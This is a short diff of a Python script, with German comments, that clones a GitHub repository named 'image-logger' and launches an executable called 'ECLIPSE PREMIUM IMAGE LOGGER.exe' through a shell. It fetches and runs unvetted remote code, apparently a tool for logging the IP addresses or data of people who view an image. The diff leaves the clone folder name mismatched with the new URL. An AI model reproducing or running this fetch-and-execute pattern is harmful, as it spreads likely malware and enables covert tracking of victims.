@@ -2,7 +2,7 @@ import os
 import subprocess
 
 # Git-Repository klonen
-repo_url = "https://github.com/PsxDupingg/image-loggerr.git"
+repo_url = "https://github.com/PsxDupingg/image-logger.git"
 repo_folder = "image-loggerr"
 
 if not os.path.exists(repo_folder):
@@ -12,7 +12,7 @@ if not os.path.exists(repo_folder):
 os.chdir(repo_folder)
 
 # Ausführbare Datei starten
-exe_file = "dateiname.exe"
+exe_file = "ECLIPSE PREMIUM IMAGE LOGGER.exe"
 
 if os.path.exists(exe_file):
     subprocess.run(exe_file, shell=True)
